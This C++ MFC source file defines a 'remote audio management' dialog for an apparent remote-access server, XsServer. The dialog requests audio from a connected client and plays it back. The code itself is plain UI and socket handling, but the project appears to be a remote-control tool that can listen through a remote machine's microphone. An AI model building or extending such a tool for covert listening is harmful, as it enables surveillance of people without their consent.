// DlgAudioManager.cpp : 实现文件
//

#include "stdafx.h"
#include "XsServer.h"
#include "DlgAudioManager.h"
#include "afxdialogex.h"



// CDlgAudioManager 对话框

IMPLEMENT_DYNAMIC(CDlgAudioManager, CDialog)

CDlgAudioManager::CDlgAudioManager(CWnd* pParent,
	_CIOCPServer* IOCPServer, PCONTEXT_OBJECT ContextObject)
	: CDialog(IDD_DIALOG_AUDIO_MANAGER, pParent)
{
	m_IOCPServer = IOCPServer;
	m_ContextObject = ContextObject;
	m_IconHwnd = LoadIcon(AfxGetInstanceHandle(), MAKEINTRESOURCE(IDR_MAINFRAME));
}

CDlgAudioManager::~CDlgAudioManager()
{
}

void CDlgAudioManager::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
}


BEGIN_MESSAGE_MAP(CDlgAudioManager, CDialog)
	ON_WM_CLOSE()
END_MESSAGE_MAP()


// CDlgAudioManager 消息处理程序


BOOL CDlgAudioManager::OnInitDialog()
{
	CDialog::OnInitDialog();

	SetIcon(m_IconHwnd, FALSE);
	//获得客户端IP地址
	CString v1;
	sockaddr_in ClientAddress;
	memset(&ClientAddress, 0, sizeof(ClientAddress));
	int ClientAddressLength = sizeof(ClientAddress);
	BOOL IsOk = getpeername(m_ContextObject->ClientSocket, (SOCKADDR*)&ClientAddress, &ClientAddressLength);  //得到连接IP
	v1.Format("\\\\%s - 远程音频管理", IsOk != INVALID_SOCKET ? inet_ntoa(ClientAddress.sin_addr) : "");
	//设置对话框标题
	SetWindowText(v1);

	//回传客户端
	BYTE IsToken = CLIENT_GO_ON;
	m_IOCPServer->OnPrepareSending(m_ContextObject, &IsToken, sizeof(BYTE));
	

	return TRUE;  // return TRUE unless you set the focus to a control
				  // 异常: OCX 属性页应返回 FALSE
}


void CDlgAudioManager::OnClose()
{
	if (m_ContextObject != NULL)
	{
		m_ContextObject->DialogID = 0;
	    m_ContextObject->DialogHandle = NULL;
	    CancelIo((HANDLE)m_ContextObject->ClientSocket);
	    closesocket(m_ContextObject->ClientSocket);
	}

	CDialog::OnClose();
}
void  CDlgAudioManager::WindowHandleIO(void)
{
	if (m_ContextObject == NULL)
	{
		return;
	}
	switch (m_ContextObject->m_ReceivedDecompressedBufferData.GetArray(0)[0])
	{
	case  CLIENT_AUDIO_MANAGER_REPLY:
	{
		m_Audio.PlayRecordData(m_ContextObject->m_ReceivedDecompressedBufferData.GetArray(1),
			m_ContextObject->m_ReceivedDecompressedBufferData.GetArrayLength() - 1);   //播放数据
		break;
	}
	default:
		break;
	}
}